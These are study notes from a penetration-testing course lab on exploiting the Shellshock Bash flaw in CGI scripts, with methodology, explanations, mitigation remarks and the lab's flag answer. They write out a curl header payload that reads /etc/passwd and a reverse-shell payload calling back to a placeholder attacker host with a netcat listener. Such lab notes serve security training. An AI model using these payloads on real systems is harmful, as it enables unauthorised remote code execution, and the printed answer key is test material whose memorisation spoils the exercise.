# Section 20 — Attacking CGI Applications - Shellshock

## ID
1901

## Module
Attacking Common Applications

## Kind
notes

## Title
Section 20 — Attacking CGI Applications - Shellshock

## Description
Exploiting the Shellshock vulnerability (CVE-2014-6271) in CGI applications to achieve remote code execution by injecting commands through HTTP headers that become Bash environment variables.

## Tags
shellshock, cgi, cve-2014-6271, reverse-shell, bash, gobuster

## Commands
- gobuster dir -u http://<TARGET_IP>/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
- curl -i http://<TARGET_IP>/cgi-bin/<SCRIPT>.cgi
- curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://<TARGET_IP>/cgi-bin/<SCRIPT>.cgi
- curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1' http://<TARGET_IP>/cgi-bin/<SCRIPT>.cgi
- sudo nc -lvnp <PORT>
- env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"

## What This Section Covers
CGI (Common Gateway Interface) is middleware that lets web servers execute external scripts (C, Perl, Python, Bash, etc.) to generate dynamic responses. Scripts live in `/cgi-bin/` and run in the web server's security context. Shellshock (CVE-2014-6271), discovered in 2014, exploits a flaw in GNU Bash ≤4.3 where environment variables containing function definitions are not parsed safely — Bash executes trailing commands appended after the function body during import. Since web servers map HTTP headers to environment variables for CGI scripts, an attacker can inject arbitrary OS commands via headers like `User-Agent`.

## Methodology
1. Fuzz for CGI scripts with `gobuster dir -u http://<IP>/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi`.
2. Confirm the discovered endpoint responds (even with empty content): `curl -i http://<IP>/cgi-bin/access.cgi`. A 200 OK with zero content length is still worth testing.
3. Test for Shellshock by injecting a command via the `User-Agent` header: `curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://<IP>/cgi-bin/access.cgi`. If `/etc/passwd` is returned, the target is vulnerable.
4. Start a netcat listener: `sudo nc -lvnp <PORT>`.
5. Send a reverse shell payload: `curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1' http://<IP>/cgi-bin/access.cgi`.
6. Catch the shell and begin post-exploitation — enumerate for sensitive data, escalate privileges, or pivot deeper into the network.

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Enumerate the host, exploit the Shellshock vulnerability, and submit the contents of flag.txt | Sh3ll_Sh0cK_123 | Reverse shell via Shellshock → `cat flag.txt` in `/usr/lib/cgi-bin/` |

## Key Takeaways
- The Shellshock payload `() { :; }; <CMD>` works because vulnerable Bash versions parse the `() { :; };` as a function definition, then blindly execute everything after the closing `;` during environment variable import.
- On a patched system, Bash requires function definitions in env vars to be prefixed with `BASH_FUNC_` and will not execute trailing commands — the old syntax is simply ignored.
- Any HTTP header can be the injection vector (User-Agent, Referer, Cookie, Accept-Language, etc.) since the web server maps all of them to environment variables for CGI processing.
- The double `echo ; echo ;` in the test payload separates the injected output from HTTP headers so the response body is clean and readable.
- CGI is considered legacy tech (high overhead, no caching, new process per request), but it still appears in pentests — especially on IoT devices and embedded systems that can't be easily upgraded.
- The shell lands as `www-data` (or the web server's user), so privilege escalation is typically the next step.

## Gotchas
- A CGI endpoint returning `200 OK` with empty content still may be vulnerable — don't skip it just because there's no visible output.
- Use full paths (`/bin/bash`, `/bin/cat`) in payloads — the CGI environment may have a minimal or empty PATH.
- Shellshock only works when the CGI script is executed via Bash. If the script runs under a different interpreter (Python, Perl), the environment variables aren't processed by Bash and the exploit won't fire.
- Mitigation is straightforward (update Bash), but on EOL systems or IoT devices, upgrading may not be possible — in those cases, network-level isolation is the interim fix.
- The `flag.txt` in the lab is in `/usr/lib/cgi-bin/` (the script's working directory), not `/root/` or `/home/`.
